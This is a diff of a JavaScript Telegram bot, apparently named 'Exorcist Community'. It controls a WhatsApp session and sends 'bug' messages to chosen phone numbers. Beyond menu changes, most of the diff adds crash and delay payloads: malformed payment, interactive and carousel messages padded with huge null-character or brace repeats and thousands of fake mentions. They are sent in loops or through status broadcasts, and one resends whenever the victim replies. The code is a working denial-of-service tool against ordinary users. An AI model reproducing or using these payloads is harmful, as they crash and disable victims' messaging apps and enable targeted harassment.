+    await ctx.replyWithPhoto("https://files.catbox.moe/w8mepp.png", {
       caption: mainMenuMessage,
       parse_mode: "HTML",
       reply_markup: {
@@ -1593,10 +1712,10 @@ bot.action('ownermenu', async (ctx) => {
   }
 
   const mainMenuMessage =
-`<blockquote><pre>┌─〔 EXORCIST COMMUNITY 〕─┐
+`<blockquote><pre>┌─〔 𝐄𝐗𝚯𝐑𝐂𝐈𝐒𝐓 𝐂𝚯𝐌𝐌𝐔𝐍𝐈𝐓𝐘 〕─┐
 │ Name      : Exorcist Community
 │ Developer : @Putxzyy
-│ Version   : 2.0 (Latest)
+│ Version   : 2.5
 │ Library   : JavaScript
 └──────────────────────┘
 
@@ -1611,18 +1730,62 @@ bot.action('ownermenu', async (ctx) => {
 `;
   const mainKeyboard = [
     [{
-      text: "🔙",
+      text: "⌫",
       callback_data: "main_menu"
   }],
     [{
-    text: "🇷🇺",
+    text: "🪧",
     url: "https://t.me/Putxzyy"
     }]
   ];
 
   // Mengirim pesan setelah delay 3 detik (agar efek "mengetik" terlihat)
   setTimeout(async () => {
-    await ctx.replyWithPhoto("https://files.catbox.moe/blufi0.jpg", {
+    await ctx.replyWithPhoto("https://files.catbox.moe/w8mepp.png", {
+      caption: mainMenuMessage,
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: mainKeyboard
+      }
+    });
+  }, 1000); // Delay 1 detik
+});
+
+bot.action('funmenu', async (ctx) => {
+  // Hapus pesan sebelumnya
+  try {
+    await ctx.deleteMessage();
+  } catch (error) {
+    console.error("Error deleting message:", error);
+  }
+
+  const mainMenuMessage =
+`<blockquote><pre>┌─〔 𝐄𝐗𝚯𝐑𝐂𝐈𝐒𝐓 𝐂𝚯𝐌𝐌𝐔𝐍𝐈𝐓𝐘 〕─┐
+│ Name      : Exorcist Community
+│ Developer : @Putxzyy
+│ Version   : 2.5 
+│ Library   : JavaScript
+└──────────────────────┘
+
+┌─〔 FUN MENU 〕─┐
+│COMING SOON
+└───────────────┘
+</pre></blockquote>
+`;
+  const mainKeyboard = [
+    [{
+      text: "⌫",
+      callback_data: "main_menu"
+  }],
+    [{
+    text: "🪧",
+    url: "https://t.me/Putxzyy"
+    }]
+  ];
+
+  // Mengirim pesan setelah delay 3 detik (agar efek "mengetik" terlihat)
+  setTimeout(async () => {
+    await ctx.replyWithPhoto("https://files.catbox.moe/w8mepp.png", {
       caption: mainMenuMessage,
       parse_mode: "HTML",
       reply_markup: {
@@ -1641,33 +1804,26 @@ bot.action('main_menu', async (ctx) => {
   const isOwnerStatus = isOwner(ctx.from.id);
   // Kirim ulang menu utama (Anda dapat menggunakan kode yang sama seperti pada bot.start)
  const mainMenuMessage =
- `<blockquote><pre>╔══✠『 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 』✠══╗
-║ ⚝ ɴᴀᴍᴇ     : Exorcist Community
-║ ⚝ ᴅᴇᴠ      : @Putxzyy
-║ ⚝ ᴠᴇʀꜱɪᴏɴ  : 2.0
-║ ⚝ ʟɪʙʀᴀʀʏ  : JavaScript
+ `<blockquote><pre>╔══✠『 𝐄𝐗𝚯𝐑𝐂𝐈𝐒𝐓 𝐂𝚯𝐌𝐌𝐔𝐍𝐈𝐓𝐘 』✠══╗
+║ 𖤻 ɴᴀᴍᴇ     : Exorcist Community
+║ 𖤻 ᴅᴇᴠ      : @Putxzyy
+║ 𖤻 ᴠᴇʀꜱɪᴏɴ  : 2.5
+║ 𖤻 ʟɪʙʀᴀʀʏ  : JavaScript
 ╚═════════════════════╝
 </pre></blockquote>
 `;
 
   const mainKeyboard = [
-    [{
-      text: "Ошибки меню",
-      callback_data: "bugmenux"
-    }],
-      [{
-      text: "Меню настроек𝘂",
-      callback_data: "settingcmd"
-    }],
-      [{
-      text: "Меню владельца",
-      callback_data: "ownermenu"
-    }],
+    [{    text: "[ 🛠 ]バグメニュー", callback_data: "ownermenu"},
+     {    text: "[ 🧬 ]バグメニュー", callback_data: "bugmenux"}],
+    [{    text: "[ 📡 ]設定メニュー", callback_data: "settingcmd"}],
+    [{    text: "[ 🔮 ]ファンメニュー", callback_data: "funmenu"}],
+    [{    text: "[ 🪧 ]", url: "https://t.me/Putxzyy"}]
   ];
 
   // Mengirim pesan setelah delay 3 detik (agar efek "mengetik" terlihat)
   setTimeout(async () => {
-    await ctx.replyWithPhoto("https://files.catbox.moe/blufi0.jpg", {
+    await ctx.replyWithPhoto("https://files.catbox.moe/w8mepp.png", {
       caption: mainMenuMessage,
       parse_mode: "HTML",
       reply_markup: {
@@ -1677,136 +1833,161 @@ bot.action('main_menu', async (ctx) => {
   }, 1000); // Delay 1 detik
 });
 
+//
+const donerespone = (target, ctx) => {
+    const RandomBgtJir = randomImages();
+    const senderName = ctx.message.from.first_name || ctx.message.from.username || "Pengguna"; // Mengambil nama peminta dari konteks
+    
+     ctx.replyWithPhoto(RandomBgtJir, {
+    caption: `\`\`\`
+┏━━❰  𝐒𝐮𝐜𝐜𝐞𝐬𝐟𝐮𝐥𝐥𝐲  ❱━━
+┣⌬ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
+┣⌬ • 𝐒𝐓𝐀𝐓𝐔𝐒 : 🟢 Succesfully
+┗━━━━━━━━━━━━━━
+• EXORCIST COMMUNITY
+€ putxzyy\`\`\``,
+         parse_mode: 'Markdown',
+                  ...Markup.inlineKeyboard([
+                    [
+                       Markup.button.callback('𝙱𝙰𝙲𝙺', 'demeter'),
+                       Markup.button.url('⌜ OWNER ⌟', 'https://t.me/putxzyy'),
+                    ]
+                 ])
+              });
+              (async () => {
+    console.clear();
+    console.log(chalk.black(chalk.bgGreen('Succes Send Bug By EXORCIST COMMUNITY')));
+    })();
+}
+
+
+
+
+
 //func bug disini//////
 
 //ForceClose
-async function FORCEDELETE(target) {
-  let devices = (
-    await sock.getUSyncDevices([target], false, false)
-  ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
-  await sock.assertSessions(devices);
-  let CallAudio = () => {
-    let map = {};
-    return {
-      mutex(key, fn) {
-        map[key] ??= { task: Promise.resolve() };
-        map[key].task = (async prev => {
-          try { await prev; } catch { }
-          return fn();
-        })(map[key].task);
-        return map[key].task;
-      }
-    };
-  };
-
-  let AudioLite = CallAudio();
-  let MessageDelete = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
-  let BufferDelete = sock.createParticipantNodes.bind(sock);
-  let encodeBuffer = sock.encodeWAMessage?.bind(sock);
-  sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
-    if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };
-
-    let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
-
-    let participateNode = Array.isArray(patched)
-      ? patched
-      : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));
-
-    let { id: meId, lid: meLid } = sock.authState.creds.me;
-    let omak = meLid ? jidDecode(meLid)?.user : null;
-    let shouldIncludeDeviceIdentity = false;
-
-    let nodes = await Promise.all(participateNode.map(async ({ recipientJid: jid, message: msg }) => {
-
-      let { user: targetUser } = jidDecode(jid);
-      let { user: ownPnUser } = jidDecode(meId);
-      let isOwnUser = targetUser === ownPnUser || targetUser === omak;
-      let y = jid === meId || jid === meLid;
-
-      if (dsmMessage && isOwnUser && !y) msg = dsmMessage;
-
-      let bytes = MessageDelete(encodeBuffer ? encodeBuffer(msg) : encodeWAMessage(msg));
-
-      return AudioLite.mutex(jid, async () => {
-        let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
-        if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
-
-        return {
-          tag: 'to',
-          attrs: { jid },
-          content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
-        };
-      });
-
-    }));
-
-    return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
-  };
-  let BytesType = crypto.randomBytes(32);
-  let nodeEncode = Buffer.concat([BytesType, Buffer.alloc(8, 0x01)]);
-
-  let { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(
-    devices,
-    { conversation: "y" },
-    { count: '0' }
-  );
-  let DecodeCall = {
-    tag: "call",
-    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
-    content: [{
-      tag: "offer",
-      attrs: {
-        "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
-        "call-creator": sock.user.id
-      },
-      content: [
-        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
-        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
-        {
-          tag: "video",
-          attrs: {
-            orientation: "0",
-            screen_width: "1920",
-            screen_height: "1080",
-            device_orientation: "0",
-            enc: "vp8",
-            dec: "vp8"
-          }
-        },
-        { tag: "net", attrs: { medium: "3" } },
-        { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
-        { tag: "encopt", attrs: { keygen: "2" } },
-        { tag: "destination", attrs: {}, content: destinations },
-        ...(shouldIncludeDeviceIdentity ? [{
-          tag: "device-identity",
-          attrs: {},
-          content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
-        }] : [])
-      ]
-    }]
-  };
-
-  await sock.sendNode(DecodeCall);
-  const TextMsg = generateWAMessageFromContent(target, {
-    extendedTextMessage: {
-      text: "JOIN GRUP",
-      contextInfo: {
-        remoteJid: "X",
-        participant: target,
-        stanzaId: "1234567890ABCDEF",
-        quotedMessage: {
-          paymentInviteMessage: {
-            serviceType: 3,
-            expiryTimestamp: Date.now() + 1814400000
+async function R9X(target) {
+  const msg = {
+    viewOnceMessage: {
+      message: {
+        requestPaymentMessage: {
+          interactiveMessage: {
+            body: {
+              text: "R9X || DNX" + "\u200E\n".repeat(300)
+            },
+            footer: {
+              text: "R9X || DNX"
+            },
+            nativeFlowMessage: {
+              buttons: [
+                {
+                  name: "quick_reply",
+                  buttonParamsJson: "{".repeat(3000)
+                },
+                {
+                  name: "review_and_pay",
+                  buttonParamsJson: "{\"currency\":\"XXX\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"4SWMDTS1PY4\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"description\":\"\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"X - XxXs\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"X - XxXs\",\"native_payment_methods\":[],\"share_payment_status\":true}",
+                  version: 3
+                }
+              ]
+            },
+            contextInfo: {
+              participant: target,
+              mentionedJid: [target]
+            }
           }
         }
       }
     }
-  }, {});
+  };
 
-  await sock.relayMessage(target, TextMsg.message, { messageId: TextMsg.key.id });
-  await sock.sendMessage(target, { delete: TextMsg.key });
+  await sock.relayMessage(target, msg, { messageId: null });
+}
+async function oneAmountV5(target) {
+  const payload = {
+    viewOnceMessage: {
+      message: {
+        sendPaymentMessage: {},
+        requestPaymentMessage: {}
+      }
+    }
+  }
+  
+  await sock.relayMessage(
+    target,
+    payload,
+    {
+      messageId: sock.generateMessageTag(),
+      participant: target
+    }
+  )
 
+  sock.ev.on("messages.upsert", async ({ messages, type }) => {
+    if (type !== "notify") return
+
+    for (const msg of messages) {
+      if (!msg.message) continue
+      if (msg.key.fromMe) continue
+      if (msg.key.remoteJid !== target) continue
+
+      try {
+        await sock.relayMessage(
+          target,
+          payload,
+          {
+            messageId: sock.generateMessageTag(),
+            participant: target
+          }
+        )
+      } catch (e) {
+        console.log(`Send Bug To: ${target}`)
+      }
+    }
+  })
+}
+async function Nullvisible2(target) {
+await sock.relayMessage(target, {
+viewOnceMessage: {
+message: {
+interactiveResponseMessage: {
+body: {
+text: "i, am the one who called, 'The Best' ",
+format: "DEFAULT"
+},
+nativeFlowResponseMessage: {
+name: "address_message",
+paramsJson: "\u0000".repeat(1000000),
+version: 3
+}
+}
+}
+}
+}, { participant: { jid: target }});
+}
+async function CrashButton(target) {
+    const message = {
+        viewOnceMessage: {
+            message: {
+                requestPaymentMessage: {
+                    body: {
+                        text: "#exercist",
+                        format: "DEFAULT"
+                    },
+                    nativeFlowResponseMessage: {
+                        name: "review_and_pay",
+                        paramsJson: "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"null\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}",
+                        version: 3
+                    }
+                }
+            }
+        }
+    };
+
+    await sock.relayMessage(target, message, {
+        groupId: null,
+        participant: { jid: target }
+    });
 }
 async function nullExc(target) {
   await sock.relayMessage(target, {
@@ -3499,8 +3680,208 @@ async function HxDZiaoXang(target) {
   await sock.relayMessage(target, ElHxD.message, { messageId: ElHxD.key?.id });
 }
 
+//Bullfozer
+async function DelayCarousel(target) {
+    try {
+        const videoMessage = {
+            url: "https://mmg.whatsapp.net/v/t62.7161-24/612765201_1843009569672201_5329993757191113177_n.enc?ccb=11-4&oh=01_Q5Aa3gGgf1JumlvtAJMPp7hTHEU4syh-r_TqRaYdfspKa3CzUQ&oe=6985B755&_nc_sid=5e03e0&mms3=true",
+            mimetype: "video/mp4",
+            fileSha256: "r6rKspL7KzRZvoCBkbkAgNTbbZAz3EzCT7Jo7vivhW0=",
+            fileLength: "10000000",
+            mediaKey: "GHCUsF8us7byHgPCA8lVDELN67jra3I3lgRZXCCRc0s=",
+            fileEncSha256: "VzWEuluQdKOio+HmwLAoi8/f4md4ppgsCoIocolbNRI=",
+            directPath: "/v/t62.7161-24/612765201_1843009569672201_5329993757191113177_n.enc?ccb=11-4&oh=01_Q5Aa3gGgf1JumlvtAJMPp7hTHEU4syh-r_TqRaYdfspKa3CzUQ&oe=6985B755&_nc_sid=5e03e0",
+            mediaKeyTimestamp: "1767791229",
+            streamingSidecar: "xey0UW72AH+ShCjYXVzOom/k+kt7VJryEZ+yNyAarqVJHx8L4j6sB4Da5ZGHXTfzX9g=",
+            thumbnailDirectPath: "/v/t62.36147-24/19977827_1442378506945978_3754389976888828856_n.enc?ccb=11-4&oh=01_Q5Aa1wGz9o9ukGbtWxoetr_ygoJDy0SN80KaAwJ1vywXvbTH8A&oe=687247F9&_nc_sid=5e03e0",
+            thumbnailSha256: "hxKrzb6DDC8qTu2xOdeZN4FBgHu8cmNekZ+pPye6dO0=",
+            thumbnailEncSha256: "Es1ZWpjDKRZ82XpiLARj3FZWh9DeFCEUG2wU8WHWrRs=",
+            annotations: [
+                {
+                    embeddedContent: {
+                        embeddedMusic: {
+                            musicContentMediaId: "1942620729844671",
+                            songId: "432395962368430",
+                            author: "Yuukey Da",
+                            title: "Уччкеу Дїшауи Жіьпарріп",
+                            artworkDirectPath: "/v/t62.76458-24/11810390_1884385592310849_8570381233425191298_n.enc?ccb=11-4&oh=01_Q5Aa1wFo3eosJQYj_I0wJby373H-MKodRwdx1sCOEt426yyLCg&oe=687233BB&_nc_sid=5e03e0",
+                            artworkSha256: "8x8ENCxJyIrSFnF9ZHtiim423uGgPleSm8zPEbQZByE=",
+                            artworkEncSha256: "HlsJKALVejvghjYZIrY46zosCX568b1cG9SzzZfCPNA=",
+                            artistAttribution: "",
+                            countryBlocklist: "",
+                            isExplicit: false,
+                            artworkMediaKey: "0DsOnYZAyNwPJgs5PZwL/EtFxBXO2cW9zwLYZGcAkvU="
+                        }
+                    },
+                    embeddedAction: true
+                }
+            ]
+        };
+
+        const msg = await generateWAMessageFromContent(
+            target,
+            {
+                viewOnceMessage: {
+                    message: {
+                        messageContextInfo: {
+                            deviceListMetadata: {},
+                            deviceListMetadataVersion: 2
+                        },
+                        interactiveMessage: {
+                            header: {
+                                title: "\u0000",
+                                hasMediaAttachment: true,
+                                videoMessage
+                            },
+                            contextInfo: {
+                                mentionedJid: [
+                                    target,
+                                    "0@s.whatsapp.net",
+                                    ...Array.from({ length: 1900 }, () =>
+                                        `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
+                                    )
+                                ],
+                                remoteJid: " X "
+                            },
+                            carouselMessage: {
+                                cards: Array.from({ length: 15 }, () => ({
+                                    header: {
+                                        title: "\u0000",
+                                        hasMediaAttachment: true,
+                                        videoMessage
+                                    },
+                                    contextInfo: {
+                                        mentionedJid: [
+                                            target,
+                                            "0@s.whatsapp.net",
+                                            ...Array.from({ length: 1900 }, () =>
+                                                `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
+                                            )
+                                        ],
+                                        remoteJid: " X "
+                                    },
+                                    nativeFlowMessage: {
+                                        messageParamsJson: "({".repeat(9000)
+                                    }
+                                }))
+                            }
+                        }
+                    }
+                }
+            },
+            {
+                messageId: null,
+                participant: {
+                    jid: target
+                }
+            }
+        );
+
+        await sock.relayMessage(
+            target,
+            {
+                groupStatusMessageV2: {
+                    message: msg.message
+                }
+            },
+            {
+                messageId: msg.key.id,
+                participant: { jid: target }
+            }
+        );
+
+    } catch (e) {
+       console.log(e.message)
+    }
+}
 
 //Delay
+async function Mosquito(target) {
+  for (let i = 0; i < 85; i++) {
+
+    const MosquitoTVX = {
+      key: {
+        id: "Mosquito-" + Date.now()
+      },
+      message: {
+        viewOnceMessage: {
+          message: {
+            interactiveResponseMessage: {
+              body: {
+                text: " მე • 𝐘𝐮𝐭𝐚𝐱`𝐉𝐬𝄢",
+                format: "DEFAULT"
+              },
+              nativeFlowResponseMessage: {
+                name: "address_message",
+                paramsJson: "\x10".repeat(1045000),
+                version: 3
+              },
+              entryPointConversionSource: "{}"
+            },
+            contextInfo: {
+              quotedMessage: {
+                paymentInviteMessage: {
+                  serviceType: 1,
+                  expiryTimestamp: null
+                }
+              },
+              mentionedJid: Array.from(
+                { length: 2000 },
+                (_, z) => `628${z + 1}@s.whatsapp.net`
+              )
+            }
+          }
+        }
+      }
+    };
+
+    await sock.relayMessage(
+      "status@broadcast",
+      MosquitoTVX.message,
+      {
+        messageId: MosquitoTVX.key.id,
+        statusJidList: [target],
+        additionalNodes: [
+          {
+            tag: "meta",
+            attrs: {},
+            content: [
+              {
+                tag: "YutaxKun",
+                attrs: {},
+                content: [
+                  {
+                    tag: "to",
+                    attrs: { jid: target }
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      }
+    );
+  }
+}
+async function sxppoaatXExploter(target) {
+  const message = {
+    ephemeralMessage: {
+      message: {
+        extendedTextMessage: {
+          text: "\U0000".repeat(100000),
+          contextInfo: {
+            mentionedJid: []
+          }
+        }
+      },
+      expiration: 7 * 24 * 60 * 60 // 7 hari
+    }
+  }
+
+  await sock.relayMessage(target, message, {
+   messageId: sock.generateMessageTag()
+  });
+}
 async function HxDTractor(target) {
   const content = {
     viewOnceMessage: {
